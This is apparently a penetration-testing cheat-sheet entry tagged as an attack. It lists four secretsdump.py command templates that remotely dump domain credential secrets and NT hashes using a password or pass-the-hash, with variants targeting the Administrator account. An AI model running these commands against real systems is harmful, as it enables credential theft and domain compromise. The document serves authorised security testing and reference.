# secretsdump
#plateform/linux #target/remote #cat/ATTACK

## Dump all secrets with password
```
secretsdump.py <domain>/<user>:'<passwd>'@<ip>
```

## Dump Administrator with password
```
secretsdump.py <domain>/<user>:'<passwd>'@<ip> -just-dc-user <target_user|Administrator>
```

## Dump all secrets with hash
```
secretsdump.py <domain>/<user>@<ip> -hashes :<nthash>
```

## Dump Administrator with hash
```
secretsdump.py <domain>/<user>@<ip> -hashes :<nthash> -just-dc-user <target_user|Administrator>
```
